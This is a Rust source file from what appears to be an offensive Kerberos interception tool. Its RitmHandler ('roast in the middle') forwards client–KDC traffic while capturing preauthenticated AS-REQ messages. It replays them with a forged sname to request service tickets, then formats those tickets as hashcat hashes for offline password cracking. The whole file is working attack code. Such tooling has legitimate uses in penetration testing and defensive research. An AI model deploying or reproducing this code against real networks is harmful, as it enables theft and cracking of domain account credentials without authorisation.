use std::{net::SocketAddr, path::PathBuf};

use kile::{roast::Roastable, structures::AsReqExt, KdcClient, KdcFrame};
use rasn::types::SequenceOf;
use rasn_kerberos::{AsReq, KerberosString, PrincipalName};
use tokio::sync::mpsc::{self, Receiver, Sender};
use tracing::{error, info, warn};

use super::{Handler, HandlerAction};

#[derive(Clone)]
pub struct RitmHandler {
    spn: PrincipalName,
    tx: Sender<AsReq>,
}

impl RitmHandler {
    pub fn new(remote_addr: SocketAddr, spn: PrincipalName) -> Self {
        //let spn = spn.split("/").map(|i| i.to_owned().into()).collect();
        let (tx, rx) = mpsc::channel::<AsReq>(100);
        tokio::spawn(Self::replay_task(rx, remote_addr, spn.clone()));
        Self { spn, tx }
    }
    async fn replay_task(mut rx: Receiver<AsReq>, remote_addr: SocketAddr, spn: PrincipalName) {
        info!("Started RITM replay task, waiting for AS-REQs...");
        while let Some(as_req) = rx.recv().await {
            // Double-check that parameters are valid for exploit
            // if as_req.0.?? != ?? {
            //     error!("AS-REQ fields are not valid for exploit, skipping");
            //     continue;
            // }
            // Do the replay attack stuff...
            info!("Attempting to replay AS-REQ with forged sname field");
            let as_req = as_req.replace_spn(spn.string.clone());
            // TODO: Handle tokio connect errors
            let mut client = KdcClient::connect(remote_addr).await.unwrap();
            // TODO: Handle tokio errors
            match client.send_as_req(as_req).await.unwrap() {
                KdcFrame::AsRep(as_rep) => {
                    if let Ok(hash) = as_rep.0.ticket.dump_to_hashcat() {
                        info!("Received AS-REP Service Ticket with {}", hash);
                    } else {
                        warn!("Failed to dump AS-REP Service Ticket to hashcat format");
                    }
                }
                KdcFrame::KrbError(e) => {
                    error!("Received KRB-ERROR response, stopping");
                    return;
                }
                _ => {
                    error!("Received unexpected response, stopping");
                    return;
                }
            }
        }
    }
}

impl Handler for RitmHandler {
    fn name(&self) -> &'static str {
        "RITM"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsReq(as_req) if as_req.get_pa_etype() != None => {
                info!("Received AS-REQ with preauth, forwarding to KDC...");
                match futures::executor::block_on(self.tx.send(as_req.to_owned())) {
                    Ok(_) => (),
                    Err(e) => error!("Tokio channel error: {:?}", e),
                };
                HandlerAction::Forward(frame)
            }
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsRep(as_rep) => {
                info!("Received AS-REP, forwarding to client...");
                HandlerAction::Forward(frame)
            }
            _ => HandlerAction::Forward(frame),
        }
    }
}
